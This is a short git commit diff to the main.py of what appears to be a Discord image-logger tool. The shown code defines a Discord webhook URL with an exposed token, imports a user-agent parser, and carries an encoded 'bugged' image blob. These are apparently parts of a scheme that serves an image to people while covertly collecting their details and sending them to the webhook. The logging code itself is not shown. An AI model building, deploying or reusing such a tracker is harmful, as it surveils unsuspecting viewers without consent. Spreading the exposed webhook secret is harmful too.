c57be211ecf0c4724115e93c3b66d49ada0a4ba9
oxyservices76-ops <oxyservices76@gmail.com>
2026-06-02 18:21:21 -0400

    Update main.py

--- api/main.py
+++ api/main.py
@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1510453694506995802/PTF0PDRor7rmxgdtgkwsGesjjz6_uRvBKrrM5iHwPxy4clWOcTTVNbpfDhrQziDHa9ir'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get('https://duckduckgo.com/?q=pic&source=chrome.ob&ia=images&iax=images&iai=https%3A%2F%2Fimages.pexels.com%2Fphotos%2F33900961%2Fpexels-photo-33900961.jpeg%3Fcs%3Dsrgb%26dl%3Dpexels-ankit-rainloure-1425442-33900961.jpg%26fm%3Djpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
